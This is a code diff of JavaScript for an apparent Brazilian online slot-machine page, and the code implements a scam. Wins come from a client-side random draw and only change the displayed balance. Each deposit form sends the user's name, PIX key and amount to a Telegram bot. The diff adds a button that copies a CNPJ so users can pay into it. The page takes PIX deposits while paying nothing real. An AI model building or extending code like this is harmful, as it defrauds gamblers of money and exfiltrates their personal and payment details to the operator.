@@ -12,25 +12,17 @@ window.girarSlots = () => {
         giros++;
         if (giros > 15) {
             clearInterval(intervalo);
-            // Chance de vitória de 40%
             if (Math.random() > 0.6) processarVitoria();
         }
     }, 100);
 };
 
 function processarVitoria() {
-    // Lê o valor da aposta atual na tela
     const apostaAtual = parseFloat(document.getElementById("valor-aposta").innerText.replace("R$ ", "").replace(",", "."));
-    
-    // Define o ganho como o dobro da aposta (ajuste o multiplicador aqui se precisar)
     const ganho = apostaAtual * 2;
-    
     let saldoEl = document.getElementById('saldo');
     let saldoAtual = parseFloat(saldoEl.innerText.replace("R$ ", "").replace(",", "."));
-    
-    // Atualiza o saldo somando exatamente o ganho calculado
     saldoEl.innerText = `R$ ${(saldoAtual + ganho).toFixed(2).replace(".", ",")}`;
-    
     const msg = document.getElementById('notificacao');
     msg.innerText = `PARABÉNS! VOCÊ GANHOU R$ ${ganho.toFixed(2).replace(".", ",")}!`;
     msg.classList.remove('hidden');
@@ -38,9 +30,6 @@ function processarVitoria() {
 }
 
 window.abrirModal = () => {
-    document.getElementById("nome-usuario").value = "";
-    document.getElementById("pix-chave").value = "";
-    document.getElementById("valor-deposito").value = "";
     document.getElementById('form-deposito').classList.remove('hidden');
     document.getElementById('info-pix').classList.add('hidden');
     document.getElementById('modal-deposito').classList.remove('hidden');
@@ -50,16 +39,21 @@ window.fecharModal = () => {
     document.getElementById('modal-deposito').classList.add('hidden');
 };
 
+window.copiarCNPJ = () => {
+    const campo = document.getElementById("chave-cnpj");
+    campo.select();
+    document.execCommand("copy");
+    alert("CNPJ copiado!");
+};
+
 window.confirmarDeposito = () => {
     const nome = document.getElementById("nome-usuario").value;
     const chave = document.getElementById("pix-chave").value;
     const valor = document.getElementById("valor-deposito").value;
-    
     if(!nome || !chave || !valor) {
         alert("Preencha todos os campos!");
         return;
     }
-
     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST", headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: `Depósito: ${nome}, Chave: ${chave}, Valor: R$${valor}` })
